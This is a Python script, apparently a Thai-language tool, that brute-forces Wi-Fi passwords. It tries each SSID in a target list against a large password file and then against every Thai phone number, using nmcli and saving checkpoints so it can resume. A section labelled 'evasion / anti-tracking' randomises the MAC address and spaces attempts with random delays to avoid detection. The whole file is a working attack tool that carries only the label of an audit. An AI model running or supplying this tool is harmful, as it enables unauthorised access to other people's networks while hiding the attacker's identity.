#!/usr/bin/env python3

import json
import random
import shutil
import subprocess
import sys
import time
from pathlib import Path


# ============================================================
# CONFIG
# ============================================================

WIFI_FILE = Path("wifi.txt")
PASSWORD_FILE = Path("password.txt")
CHECKPOINT_FILE = Path(".wifi-audit-checkpoint.json")

INTERFACE = "wlan0"

# แสดง progress ทุกกี่ candidate
PROGRESS_EVERY = 50_000

# บันทึก checkpoint ทุกกี่ candidate
CHECKPOINT_EVERY = 50_000

# หน่วงเวลาสุ่ม (วินาที) ระหว่างแต่ละ Candidate
DELAY_MIN = 0.1
DELAY_MAX = 0.3

# คำนำหน้าเบอร์โทรศัพท์
PHONE_PREFIXES_10 = ["06", "08", "09"]
PHONE_PREFIXES_9 = ["02", "03", "04", "05", "07"]

# เปิด/ปิด การสลับ MAC Address อัตโนมัติ
ENABLE_MAC_SPOOFING = True


# ============================================================
# COMMAND
# ============================================================

def run_command(args, timeout=20):
    try:
        return subprocess.run(
            args,
            text=True,
            capture_output=True,
            timeout=timeout,
            check=False,
        )
    except subprocess.TimeoutExpired:
        return None


# ============================================================
# NETWORKMANAGER & EVASION / ANTI-TRACKING
# ============================================================

def randomize_mac():
    if not ENABLE_MAC_SPOOFING:
        return

    run_command(["sudo", "ip", "link", "set", "dev", INTERFACE, "down"], timeout=10)
    
    if shutil.which("macchanger"):
        run_command(["sudo", "macchanger", "-r", INTERFACE], timeout=10)
    else:
        mac = "02:%02x:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255), random.randint(0, 255), 
            random.randint(0, 255), random.randint(0, 255), 
            random.randint(0, 255)
        )
        run_command(["sudo", "ip", "link", "set", "dev", INTERFACE, "address", mac], timeout=10)

    run_command(["sudo", "ip", "link", "set", "dev", INTERFACE, "up"], timeout=10)
    time.sleep(1.5)


def rescan_wifi():
    result = run_command([
        "nmcli", "device", "wifi", "rescan", "ifname", INTERFACE
    ], timeout=15)
    if result is None:
        return False
    time.sleep(random.uniform(1.0, 2.0))
    return result.returncode == 0


def wifi_visible(ssid):
    result = run_command([
        "nmcli", "-t", "-f", "SSID", "device", "wifi", "list", "ifname", INTERFACE
    ], timeout=10)
    if result is None or result.returncode != 0:
        return False

    networks = {line.strip() for line in result.stdout.splitlines() if line.strip()}
    return ssid in networks


def connection_state():
    result = run_command([
        "nmcli", "-t", "-f", "GENERAL.STATE", "device", "show", INTERFACE
    ], timeout=10)
    if result is None or result.returncode != 0:
        return False
    return "100 (connected)" in result.stdout


def disconnect_wifi():
    result = run_command(["nmcli", "device", "disconnect", INTERFACE], timeout=10)
    return result is not None and result.returncode == 0


def cleanup_nm_profiles(ssid):
    run_command(["nmcli", "connection", "delete", ssid], timeout=10)


# ============================================================
# VERIFIER & PHONE GENERATOR
# ============================================================

def check_candidate(ssid, candidate):
    time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))

    connect_result = run_command([
        "nmcli", "device", "wifi", "connect", ssid, "password", candidate
    ], timeout=12)

    if connect_result is None or connect_result.returncode != 0:
        cleanup_nm_profiles(ssid)
        return False

    is_connected = connection_state()
    disconnect_wifi()
    cleanup_nm_profiles(ssid)
    return is_connected


def phone_number_generator():
    for prefix in PHONE_PREFIXES_10:
        for i in range(100_000_000):
            yield f"{prefix}{i:08d}"

    for prefix in PHONE_PREFIXES_9:
        for i in range(10_000_000):
            yield f"{prefix}{i:07d}"


# ============================================================
# INPUT & CHECKPOINT
# ============================================================

def check_files():
    if not WIFI_FILE.exists():
        sys.exit(f"ERROR: ไม่พบ {WIFI_FILE.resolve()}")
    if not PASSWORD_FILE.exists():
        sys.exit(f"ERROR: ไม่พบ {PASSWORD_FILE.resolve()}")
    if not shutil.which("nmcli"):
        sys.exit("ERROR: ไม่พบ nmcli")


def load_wifi_targets():
    with WIFI_FILE.open("r", encoding="utf-8-sig", errors="replace") as file:
        targets = [line.strip() for line in file if line.strip()]
    if not targets:
        sys.exit("ERROR: wifi.txt ไม่มี SSID")
    return targets


def save_checkpoint(ssid_index, ssid, line_number, mode="password", phone_index=0):
    data = {
        "ssid_index": ssid_index,
        "ssid": ssid,
        "line": line_number,
        "mode": mode,
        "phone_index": phone_index,
    }
    temp_file = Path(str(CHECKPOINT_FILE) + ".tmp")
    temp_file.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
    temp_file.replace(CHECKPOINT_FILE)


def load_checkpoint():
    if not CHECKPOINT_FILE.exists():
        return None
    try:
        return json.loads(CHECKPOINT_FILE.read_text(encoding="utf-8"))
    except (OSError, ValueError, TypeError):
        return None


def clear_checkpoint():
    try:
        CHECKPOINT_FILE.unlink(missing_ok=True)
    except OSError:
        pass


# ============================================================
# AUDIT ONE WIFI
# ============================================================

def audit_wifi(ssid, ssid_index, total, start_line=0, start_mode="password", start_phone_index=0):
    print()
    print("=" * 76)
    print(f"[{ssid_index + 1}/{total}] SSID: {ssid}")
    print("=" * 76)

    print("Rotating MAC Address...", end="", flush=True)
    randomize_mac()
    print(" OK")

    print("Rescan Wi-Fi...", end="", flush=True)
    if not rescan_wifi():
        print(" ERROR")
        return {"ssid": ssid, "success": False, "password": None, "password_line": None, "checked": 0, "reason": "RESCAN ERROR"}
    print(" OK")

    print("Check SSID...", end="", flush=True)
    if not wifi_visible(ssid):
        print(" NOT FOUND")
        return {"ssid": ssid, "success": False, "password": None, "password_line": None, "checked": 0, "reason": "SSID NOT VISIBLE"}
    print(" FOUND")

    print()
    checked = 0
    started_at = time.monotonic()
    passwords_exhausted = False

    # PHASE 1: PASSWORD.TXT (รองรับ 50 ล้านแถวแบบ Optimized Buffering)
    if start_mode == "password":
        print(f"Password file : {PASSWORD_FILE} (50M Rows Target)")
        if start_line > 0:
            print(f"Resume (File) : after line {start_line:,}")
        else:
            print("Starting      : line 1 (Password File)")
        print()

        with PASSWORD_FILE.open("r", encoding="utf-8-sig", errors="replace", buffering=4 * 1024 * 1024) as password_file:
            for line_number, line in enumerate(password_file, 1):
                if line_number <= start_line:
                    continue

                candidate = line.rstrip("\r\n")
                if not candidate:
                    continue

                checked += 1
                success = check_candidate(ssid, candidate)

                if success:
                    print()
                    print("*" * 76)
                    print("MATCH FOUND (PASSWORD FILE)")
                    print("*" * 76)
                    print(f"SSID          : {ssid}")
                    print(f"PASSWORD      : {candidate}")
                    print(f"LINE / INDEX  : {line_number:,}")
                    print(f"CHECKED       : {checked:,}")
                    return {
                        "ssid": ssid,
                        "success": True,
                        "password": candidate,
                        "password_line": line_number,
                        "checked": checked,
                        "reason": "",
                    }

                if checked % CHECKPOINT_EVERY == 0:
                    save_checkpoint(ssid_index, ssid, line_number, mode="password", phone_index=0)

                if checked % PROGRESS_EVERY == 0:
                    elapsed = time.monotonic() - started_at
                    rate = (checked / elapsed) if elapsed > 0 else 0
                    print(f"Checked (File): {checked:,} | line={line_number:,} | rate={rate:,.2f}/s")
        
        passwords_exhausted = True
    else:
        passwords_exhausted = True

    # PHASE 2: PHONE NUMBER GENERATOR
    if passwords_exhausted:
        print()
        print("=" * 76)
        print("PASSWORD FILE EXHAUSTED -> SWITCHING TO PHONE NUMBER GENERATOR")
        print("=" * 76)
        
        phone_gen = phone_number_generator()
        phone_count = 0

        for p_idx, candidate in enumerate(phone_gen):
            if start_mode == "phone" and p_idx < start_phone_index:
                continue

            phone_count += 1
            checked += 1

            success = check_candidate(ssid, candidate)

            if success:
                print()
                print("*" * 76)
                print("MATCH FOUND (PHONE GENERATOR)")
                print("*" * 76)
                print(f"SSID          : {ssid}")
                print(f"PASSWORD      : {candidate}")
                print(f"PHONE INDEX   : {p_idx:,}")
                print(f"CHECKED       : {checked:,}")
                return {
                    "ssid": ssid,
                    "success": True,
                    "password": candidate,
                    "password_line": p_idx,
                    "checked": checked,
                    "reason": "",
                }

            if checked % CHECKPOINT_EVERY == 0:
                save_checkpoint(ssid_index, ssid, line_number=0, mode="phone", phone_index=p_idx)

            if phone_count % PROGRESS_EVERY == 0:
                elapsed = time.monotonic() - started_at
                rate = (checked / elapsed) if elapsed > 0 else 0
                print(f"Checked (Phone): {checked:,} | phone_idx={p_idx:,} | rate={rate:,.2f}/s")

    print()
    print("RESULT        : N")
    print(f"CHECKED       : {checked:,}")
    return {
        "ssid": ssid,
        "success": False,
        "password": None,
        "password_line": None,
        "checked": checked,
        "reason": "NO MATCH",
    }


# ============================================================
# MAIN & SUMMARY
# ============================================================

def print_summary(results):
    passed = [r for r in results if r["success"]]
    failed = [r for r in results if not r["success"]]

    print()
    print("=" * 76)
    print("WIFI AUDIT SUMMARY")
    print("=" * 76)
    print(f"TOTAL   : {len(results)}")
    print(f"SUCCESS : {len(passed)}")
    print(f"FAILED  : {len(failed)}")


def main():
    check_files()
    wifi_list = load_wifi_targets()
    checkpoint = load_checkpoint()

    start_ssid_index = 0
    resume_line = 0
    resume_mode = "password"
    resume_phone_index = 0

    if checkpoint:
        try:
            start_ssid_index = int(checkpoint.get("ssid_index", 0))
            resume_line = int(checkpoint.get("line", 0))
            resume_mode = checkpoint.get("mode", "password")
            resume_phone_index = int(checkpoint.get("phone_index", 0))
        except (ValueError, TypeError):
            pass

    results = []

    try:
        for index, ssid in enumerate(wifi_list):
            if index < start_ssid_index:
                continue
            
            line = resume_line if (index == start_ssid_index and resume_mode == "password") else 0
            mode = resume_mode if index == start_ssid_index else "password"
            phone_idx = resume_phone_index if (index == start_ssid_index and resume_mode == "phone") else 0

            result = audit_wifi(
                ssid, index, len(wifi_list),
                start_line=line, start_mode=mode, start_phone_index=phone_idx
            )
            results.append(result)

            save_checkpoint(index + 1, "", 0, mode="password", phone_index=0)
            resume_line = 0
            resume_mode = "password"
            resume_phone_index = 0

            if connection_state():
                disconnect_wifi()
                time.sleep(1)

        clear_checkpoint()

    except KeyboardInterrupt:
        print("\n\n" + "=" * 76)
        print("STOPPED - Checkpoint saved successfully.")
        print("=" * 76)
        return 130

    print_summary(results)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())